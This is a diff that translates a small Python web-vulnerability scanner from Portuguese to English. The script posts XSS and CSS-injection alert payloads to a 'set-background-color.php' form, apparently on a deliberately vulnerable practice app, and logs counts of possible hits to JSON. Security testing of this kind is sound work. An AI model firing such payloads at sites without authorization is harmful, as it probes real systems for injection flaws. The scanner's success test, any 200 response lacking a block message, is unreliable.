@@ -6,87 +6,87 @@ import json
 from datetime import datetime
 from pathlib import Path
 
-#diretório dos logs .json
+# JSON log directory
 logs_dir = Path('logs')
-logs_dir.mkdir(exist_ok=True)#script para criar pasta log quando não existir
+logs_dir.mkdir(exist_ok=True)  # Script to create log folder when it does not exist
 
 if len(sys.argv) > 2:
-    url_base = sys.argv[1]  # Recebe a URL base como argumento do código principal
-    taxa_envio = sys.argv[2]  # Recebe a taxa de envio como segundo argumento
+    base_url = sys.argv[1]  # Receives the base URL as the main code argument
+    send_rate = sys.argv[2]  # Receives the send rate as the second argument
 else:
-    print("URL base e/ou taxa de envio não foram fornecidas.")
+    print("Base URL and/or send rate not provided.")
     sys.exit(1)
 
-# Mapeia a taxa de envio para um intervalo de tempo específico
-delays = {'baixo': 7, 'medio': 2, 'alto': 0.5}
-delay = delays.get(taxa_envio, 2)  # Usa 'medio' como padrão se a taxa não for reconhecida
+# Maps the send rate to a specific time interval
+delays = {'low': 7, 'medium': 2, 'high': 0.5}
+delay = delays.get(send_rate, 2)  # Uses 'medium' as default if the rate is not recognized
 
-# Construir a URL alvo usando a URL base e o nome da página
-url_alvo = f"{url_base}/index.php?page=set-background-color.php"
-print(url_alvo)
+target_url = f"{base_url}/index.php?page=set-background-color.php"
+print(target_url)
 
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
 }
 
-# Lista de campos para testar
-campos_formulario = ['background_color']
+# List of fields to test
+form_fields = ['background_color']
 
-# Dicionário com payloads para cada tipo de vulnerabilidade, incluindo um para burlar a validação JavaScript
+# Dictionary with payloads for each type of vulnerability, including one to bypass JavaScript validation
 payloads = {
     'XSS': "<script>alert('XSS')</script>",
     'CSS Injection': "background: url(javascript:alert('CSS Injection'));"
 }
 
-# Contadores para os resultados dos testes
-total_testes = 0
-testes_passaram = 0
-testes_falharam = 0
+# Counters for test results
+total_tests = 0
+tests_passed = 0
+tests_failed = 0
 
-# Realizar os testes
-for campo in campos_formulario:
-    for tipo_vulnerabilidade, payload in payloads.items():
-        # Preparar os dados do formulário, com um campo contendo o payload e os outros 'teste'
-        dados_formulario = {c: 'teste' for c in campos_formulario}  # Todos os campos com 'teste'
-        dados_formulario[campo] = payload  # Campo atual com o payload
+# Conducting tests
+for field in form_fields:
+    for vulnerability_type, payload in payloads.items():
+        # Prepare form data, with one field containing the payload and the others 'test'
+        form_data = {c: 'test' for c in form_fields}  # All fields with 'test'
+        form_data[field] = payload  # Current field with the payload
 
-        # Incrementar o contador total de testes
-        total_testes += 1
+        # Increment the total test counter
+        total_tests += 1
 
-        # Enviar a requisição
-        resposta_teste = requests.post(url_alvo, data=dados_formulario, headers=headers)
+        # Send the request
+        test_response = requests.post(target_url, data=form_data, headers=headers)
 
-        print(f"Teste {total_testes}: Campo '{campo}' com payload '{payload}'. Código de status: {resposta_teste.status_code}")
+        print(f"Test {total_tests}: Field '{field}' with payload '{payload}'. Status code: {test_response.status_code}")
 
-        # Verifica se o teste foi bem-sucedido baseando-se no código de status e no conteúdo da resposta
-        if resposta_teste.status_code == 200 and "Acesso Bloqueado" not in resposta_teste.text:
-            print(f"Teste #{total_testes} PASSOU: Vulnerabilidade '{tipo_vulnerabilidade}' possivelmente encontrada no campo '{campo}'!")
-            testes_passaram += 1
+        # Check if the test was successful based on the status code and response content
+        if test_response.status_code == 200 and "Access Blocked" not in test_response.text:
+            print(f"Test #{total_tests} PASSED: Vulnerability '{vulnerability_type}' potentially found in field '{field}'!")
+            tests_passed += 1
         else:
-            print(f"Teste #{total_testes} FALHOU: Código de status: {resposta_teste.status_code} ou acesso bloqueado.")
-            testes_falharam += 1
-        time.sleep(delay)  # Adiciona uma pausa entre as requisições baseada na taxa de envio
-# Reportar os resultados finais
-print(f"\nTotal de Testes: {total_testes}")
-print(f"Testes Passaram: {testes_passaram}")
-print(f"Testes Falharam: {testes_falharam}")
-print(f"Url Testada: {url_alvo}")
+            print(f"Test #{total_tests} FAILED: Status code: {test_response.status_code} or blocked access.")
+            tests_failed += 1
+        time.sleep(delay)  # Adds a pause between requests based on the send rate
 
-#-------------------------Parte de obtenção dos dados--------------------------------------- 
-# Gravar os resultados em um arquivo JSON
-resultados = {
-    'data_hora': datetime.now().strftime("%Y-%m-%d_%H-%M-%S"),
-    'url_base': url_base,
-    'total_testes': total_testes,
-    'testes_passaram': testes_passaram,
-    'testes_falharam': testes_falharam,
-    'url_testada': url_alvo
+# Reporting final results
+print(f"\nTotal Tests: {total_tests}")
+print(f"Tests Passed: {tests_passed}")
+print(f"Tests Failed: {tests_failed}")
+print(f"Tested URL: {target_url}")
+
+# Data retrieval part
+# Record the results in a JSON file
+results = {
+    'date_time': datetime.now().strftime("%Y-%m-%d_%H-%M-%S"),
+    'base_url': base_url,
+    'total_tests': total_tests,
+    'tests_passed': tests_passed,
+    'tests_failed': tests_failed,
+    'tested_url': target_url
 }
 
-nome_arquivo = f"resultados_{resultados['data_hora']}.json"
-caminho_completo_arquivo = logs_dir.joinpath(nome_arquivo)
+file_name = f"results_{results['date_time']}.json"
+full_file_path = logs_dir.joinpath(file_name)
 
-with open(caminho_completo_arquivo, 'w') as arquivo:
-    json.dump(resultados, arquivo, indent=4)
+with open(full_file_path, 'w') as file:
+    json.dump(results, file, indent=4)
 
-print(f"\nResultados gravados em {caminho_completo_arquivo}")
+print(f"\nResults recorded in {full_file_path}")
